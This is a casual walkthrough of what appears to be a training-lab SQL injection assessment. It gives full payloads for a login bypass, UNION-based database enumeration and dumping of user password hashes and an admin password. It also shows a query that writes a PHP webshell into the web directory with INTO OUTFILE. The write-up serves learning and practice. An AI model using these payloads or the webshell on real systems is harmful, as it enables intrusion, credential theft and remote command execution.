# Skill Assessment

First I can see a login, try to sqli basic -->

```
admin' or 1=1-- -
```

<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Then, i can see search panel and info of names, i test if this field is vulnerable:

<figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

It is vulnerable, true. Now i try to connect to unions select -->

```
ADAM' UNION SELECT 1,2,3,4,5-- -
```

<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

Nice try daddy, now i list the secure\_file\_priv, to view if this field is vulnerable:

```
ADAM' UNION SELECT 1,2, variable_name, variable_value, 5 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

<figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

Now, i try to upload a webshell -->

```
adam' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/shell.php'-- -
```

<figure><img src="../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/kunqia-ltyeri.gif" alt=""><figcaption></figcaption></figure>

No problem, i will try display the bbdd and password of admin to login and do it upload

```
ADAM' UNION select 1,schema_name,3,4,5 from INFORMATION_SCHEMA.SCHEMATA-- -
```

<figure><img src="../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

List all bbdd, and see ilfreight and backup, nice. I see with database(), what ddbb is using this webapp:

```
ADAM' UNION select 1,database(),2,3,4-- -
```

<figure><img src="../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

NICE, now list all tables, columns and info -->

```
ADAM' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4,5 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -
```

<figure><img src="../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

```
ADAM' UNION select 1,2,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -
```

<figure><img src="../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

Now we can see all content off this columns -->

```
ADAM' UNION select 1,2, username, password, 4 from ilfreight.users-- -
```

<figure><img src="../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

> adam : 1be9f5d3a82847b8acca40544f953515

Try to login again into the login... but...

<figure><img src="../../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

<div data-full-width="false"><figure><img src="../../../.gitbook/assets/cristiano-ronaldo-llorando.gif" alt="" width="281"><figcaption></figcaption></figure></div>

NO SURRENDER! I will try to enum the backup bbdd

<figure><img src="../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

```
ADAM' UNION select 1,2,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='admin_bk'-- -
```

<figure><img src="../../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

Now, i list the columns:

```
ADAM' UNION select 1,2,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='admin_bk'-- -
```

<figure><img src="../../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

To the end, i display all data of this comuns -->

```
ADAM' UNION select 1,2, username, password, 4 from backup.admin_bk-- -
```

<figure><img src="../../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

> admin : Inl@n3\_fre1gh7\_adm!n

NOW YEAAAHHH, but... it is the same user i have... sooooo.&#x20;

<figure><img src="../../../.gitbook/assets/branye-why.gif" alt=""><figcaption></figcaption></figure>

There are something i am doing bad... The above responde message is: Permsion Denied... Yeah... but... the query is it:

```
' union select "",'<?php system($_REQUEST[0]); ?>', "","", "" into outfile '/var/www/html/shell.php'-- -
```

<figure><img src="../../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

"Cant create to file in /var/www/html", but... i am in /dashboad/dasboard.php, try it -->

```
' union select "",'<?php system($_REQUEST[0]); ?>', "","", "" into outfile '/var/www/html/dashboard/shell.php'-- -
```

NOTHING ERROR!! Search the file

<figure><img src="../../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

> HOLY SH1T!! I NEED SLEEP

<figure><img src="../../../.gitbook/assets/ronaldo-cr7.gif" alt="" width="374"><figcaption></figcaption></figure>
